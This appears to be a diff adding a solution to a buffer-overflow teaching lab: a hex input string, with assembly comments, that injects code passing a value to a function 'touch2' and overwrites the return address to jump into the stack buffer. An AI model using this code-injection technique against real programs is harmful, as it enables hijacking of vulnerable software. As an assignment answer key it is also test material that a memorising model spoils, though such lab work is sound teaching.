@@ -1,0 +1,8 @@
+48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi  -- Passing a parameter to function touch2 */
+68 ec 17 40 00          /* pushq  $0x4017ec         -- Address of function touch2 */
+c3                      /* retq                     -- Move to function touch2 */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00
+78 dc 61 55 00 00 00 00 /* Jump to 0x5561dc78, address of buffer */
